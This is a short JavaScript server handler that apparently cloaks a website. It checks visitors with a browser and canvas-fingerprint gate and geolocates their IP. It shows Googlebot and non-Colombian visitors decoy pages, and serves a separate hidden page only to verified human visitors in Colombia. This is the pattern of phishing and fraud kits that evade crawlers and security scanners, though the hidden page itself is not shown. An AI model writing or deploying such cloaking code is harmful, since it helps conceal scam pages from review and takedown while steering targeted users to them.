import fs from 'fs';
import path from 'path';
import { promisify } from 'util';

const readFile = promisify(fs.readFile);
const googleIps = ['66.249.66.1', '66.249.66.2'];

function getClientIP(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
  return req.connection.remoteAddress || '';
}

function isGoogleBot(userAgent, ip) {
  return userAgent.includes('Googlebot') && googleIps.includes(ip);
}

async function getCountryCode(ip) {
  const defaultCode = 'UN';
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await res.json();
    return data.countryCode || defaultCode;
  } catch (e) {
    return defaultCode;
  }
}

async function sendHtmlFile(res, filename) {
  const filePath = path.join(process.cwd(), 'public', filename);
  try {
    const content = await readFile(filePath, 'utf-8');
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(content);
  } catch (err) {
    res.status(500).send('Error al cargar el archivo HTML');
  }
}

export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';
  const ip = getClientIP(req);
  const jsVerified = req.cookies?.js_verified || '0';
  const canvasFp = req.cookies?.canvas_fp || null;
  const country = await getCountryCode(ip);
  const isBot = isGoogleBot(userAgent, ip);

  if (!isBot && (jsVerified !== '1' || !canvasFp)) {
    return res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head><meta charset="UTF-8"><title>Verificando navegador...</title></head>
      <body>
      <p>Verificando navegador, espere...</p>
      <script>
      document.cookie = "js_verified=1; path=/; max-age=3600; SameSite=Lax";
      function getCanvasFp(){
          var canvas = document.createElement('canvas');
          var ctx = canvas.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillText('fp', 2, 2);
          return canvas.toDataURL();
      }
      var fp = getCanvasFp();
      document.cookie = "canvas_fp=" + encodeURIComponent(fp) + "; path=/; max-age=3600; SameSite=Lax";
      setTimeout(function(){ location.reload(); }, 1000);
      </script>
      </body>
      </html>
    `);
  }

  if (isBot) {
    return await sendHtmlFile(res, 'index.html');
  }

  if (country !== 'CO') {
    return await sendHtmlFile(res, 'n.html');
  }

  return await sendHtmlFile(res, 'lad.html');
}
